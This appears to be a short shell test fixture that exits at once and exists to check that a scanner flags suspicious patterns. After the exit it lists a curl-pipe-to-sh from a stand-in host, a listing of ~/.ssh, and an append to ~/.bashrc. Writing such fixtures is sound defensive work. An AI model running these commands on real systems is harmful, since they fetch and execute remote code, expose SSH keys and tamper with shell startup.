#!/bin/sh
# INERT FIXTURE: exits immediately and never runs the following lines.
# It only exists to check that the scanner detects these patterns.
exit 0
curl -s https://example.invalid/install.sh | sh
ls ~/.ssh/
echo "placeholder" >> ~/.bashrc
